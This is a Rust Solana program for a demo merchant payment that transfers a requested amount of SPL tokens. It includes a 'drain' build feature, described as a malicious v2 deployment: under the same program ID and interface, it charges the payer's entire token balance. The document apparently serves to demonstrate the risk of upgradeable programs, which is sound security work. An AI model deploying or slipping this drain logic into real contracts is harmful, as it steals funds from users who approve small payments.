use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

/// SPL Token program ID (`TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA`).
const TOKEN_PROGRAM_ID: Pubkey = Pubkey::new_from_array([
    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172, 28, 180, 133,
    237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,
]);
const TOKEN_TRANSFER: u8 = 3;
const TOKEN_AMOUNT_OFFSET: usize = 64;

/// Demo merchant payment with test tokens: `pay(amount)` moves `amount` from
/// the payer's token account to the merchant's token account.
///
/// Accounts: payer token account (writable), merchant token account
/// (writable), payer token authority (signer), SPL Token program.
///
/// The `drain` feature builds the malicious v2 deployment. It keeps the same
/// program ID and instruction interface but moves the payer's entire token
/// balance instead of the requested amount. It exists only to demonstrate an
/// upgrade that changes behavior behind an unchanged program ID.
fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let mut iter = accounts.iter();
    let source = next_account_info(&mut iter)?;
    let merchant = next_account_info(&mut iter)?;
    let authority = next_account_info(&mut iter)?;
    let token_program = next_account_info(&mut iter)?;
    if *token_program.key != TOKEN_PROGRAM_ID || *source.owner != TOKEN_PROGRAM_ID {
        return Err(ProgramError::IncorrectProgramId);
    }
    let requested = u64::from_le_bytes(
        instruction_data
            .get(..8)
            .ok_or(ProgramError::InvalidInstructionData)?
            .try_into()
            .map_err(|_| ProgramError::InvalidInstructionData)?,
    );

    let amount = if cfg!(feature = "drain") {
        let data = source.try_borrow_data()?;
        let balance = u64::from_le_bytes(
            data.get(TOKEN_AMOUNT_OFFSET..TOKEN_AMOUNT_OFFSET + 8)
                .ok_or(ProgramError::AccountDataTooSmall)?
                .try_into()
                .map_err(|_| ProgramError::AccountDataTooSmall)?,
        );
        msg!("merchant-pay v2 requested={} charged={}", requested, balance);
        balance
    } else {
        msg!("merchant-pay v1 requested={} charged={}", requested, requested);
        requested
    };

    let mut data = vec![TOKEN_TRANSFER];
    data.extend_from_slice(&amount.to_le_bytes());
    invoke(
        &Instruction {
            program_id: TOKEN_PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*source.key, false),
                AccountMeta::new(*merchant.key, false),
                AccountMeta::new_readonly(*authority.key, true),
            ],
            data,
        },
        &[source.clone(), merchant.clone(), authority.clone()],
    )
}
